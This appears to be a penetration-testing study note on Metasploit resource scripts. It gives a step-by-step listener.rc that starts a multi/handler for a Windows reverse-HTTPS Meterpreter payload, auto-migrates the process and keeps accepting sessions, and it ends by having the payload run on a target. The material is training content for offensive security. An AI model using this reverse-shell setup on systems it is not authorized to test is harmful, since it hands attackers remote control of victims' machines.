---
tags: metasploit, meterpreter
---
## Resource scripts
chain together a series of **Metasploit console commands** and **Ruby code**

There are some scripts provided by Metasploit at `/usr/share/metasploit-framework/scripts/resource`, or we can write our own script. Before we attempt to use provided scripts, we should thoroughly examine, understand, and modify them to fit our needs.

> Some provided scripts use the global datastore of Metasploit to set options such as RHOSTS. When we use `set` or `unset`, we define options in the context of a running module. However, we can also define values for options across all modules by setting **global options**. These options can be set with `setg` and unset with `unsetg`.

E.g. creating a resource script that starts a multi/handler listener for a non-staged Windows 64-bit Meterpreter payload
1. Create a file in the home directory of the user kali named **listener.rc** and open it in an editor
2. Write the sequence of commands we want to execute in the file:
   `use exploit/multi/handler`
   `set PAYLOAD windows/meterpreter_reverse_https`
   `set LHOST 192.168.119.4`
   `set LPORT 443`
3. Continue writing, configure AutoRunScript to automatically execute a module (migrating to another process) after a session is created:
   `set AutoRunScript post/windows/manage/migrate`
4. Continue writing, set ExitOnSession to false to ensure that the listener keeps accepting new connections after a session is created:
   `set ExitOnSession false`
5. Continue writing, add `run` with the arguments `-z` and `-j` to run it as a job in the background and to stop us from automatically interacting with the session:
   `run -z -j`
6. Save the script
7. Start Metasploit and specify the script:
   `sudo msfconsole -r listener.rc`
	- `-r`: specify script
8. The output should show that the commands in the script were executed 
9. Download and execute Meterpreter payload executable on target machine
10. Metaploit should notify us about the incoming connection, and automatically migrate the process


